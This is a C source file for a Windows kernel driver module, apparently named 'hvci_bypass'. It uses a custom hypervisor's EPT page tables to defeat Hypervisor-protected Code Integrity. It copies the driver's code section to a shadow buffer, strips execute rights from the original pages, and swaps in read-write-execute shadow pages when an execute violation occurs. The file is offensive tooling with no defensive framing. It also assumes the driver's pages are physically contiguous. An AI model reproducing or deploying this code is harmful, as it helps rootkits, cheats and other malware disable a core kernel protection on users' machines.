#include "hvci_bypass.h"
#include "hypervisor.h"
static PVOID g_DriverTextStart = NULL;
static ULONG g_DriverTextSize = 0;
static PVOID g_ShadowText = NULL;
static UINT64 g_TextPhysBase = 0;

NTSTATUS InitHvciBypass() {
    if (!g_Vmx.HypervisorActive) return STATUS_NOT_SUPPORTED;
    PDRIVER_OBJECT driver = g_DeviceObject->DriverObject;
    g_DriverTextStart = driver->DriverStart;
    g_DriverTextSize = driver->DriverSize;
    if (!g_DriverTextStart || !g_DriverTextSize) return STATUS_UNSUCCESSFUL;
    g_ShadowText = ExAllocatePoolWithTag(NonPagedPool, g_DriverTextSize, 'txSh');
    if (!g_ShadowText) return STATUS_INSUFFICIENT_RESOURCES;
    RtlCopyMemory(g_ShadowText, g_DriverTextStart, g_DriverTextSize);
    g_TextPhysBase = MmGetPhysicalAddress(g_DriverTextStart).QuadPart & ~0xFFFULL;
    for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
        UINT64 physAddr = g_TextPhysBase + offset;
        PUINT64 pte = NULL;
        while (!pte) pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
        *pte &= ~4ULL;
    }
    __invept(1, NULL);
    return STATUS_SUCCESS;
}

VOID CleanupHvciBypass() {
    if (g_ShadowText) { ExFreePoolWithTag(g_ShadowText, 'txSh'); g_ShadowText = NULL; }
    if (g_TextPhysBase && g_Vmx.HypervisorActive) {
        for (ULONG offset = 0; offset < g_DriverTextSize; offset += PAGE_SIZE) {
            UINT64 physAddr = g_TextPhysBase + offset;
            PUINT64 pte = NULL;
            while (!pte) pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, physAddr);
            *pte |= 4ULL;
        }
        __invept(1, NULL);
    }
}

BOOLEAN HandleHvciExecuteViolation(UINT64 GuestPhysAddr, UINT64 GuestRip) {
    if (!g_DriverTextStart || !g_ShadowText) return FALSE;
    UINT64 base = g_TextPhysBase;
    if (GuestPhysAddr >= base && GuestPhysAddr < base + g_DriverTextSize) {
        ULONG offset = (ULONG)(GuestPhysAddr - base);
        UINT64 shadowPhys = MmGetPhysicalAddress((PUCHAR)g_ShadowText + offset).QuadPart & ~0xFFFULL;
        PUINT64 pte = NULL;
        while (!pte) pte = EptSplitTo4Kb(g_Vmx.EptPml4Phys, GuestPhysAddr);
        *pte = (shadowPhys & ~0xFFFULL) | 7;
        __invept(1, NULL);
        return TRUE;
    }
    return FALSE;
}
